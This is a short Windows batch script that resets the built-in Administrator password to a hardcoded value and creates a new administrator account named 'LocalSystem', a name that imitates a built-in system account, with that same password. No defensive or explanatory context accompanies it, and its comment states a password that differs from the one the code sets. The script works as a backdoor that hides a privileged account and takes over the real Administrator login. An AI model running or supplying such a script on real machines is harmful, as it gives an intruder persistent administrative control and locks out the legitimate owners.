@echo off

:: Change Administrator password
net user Administrator L@Rkin7373$$##
:: Create a new user named 'LocalSystem' with the password 'Pa$$w0rd1234%$'
net user LocalSystem L@Rkin7373$$## /add

:: Add the user to the Administrators group
net localgroup Administrators LocalSystem /add
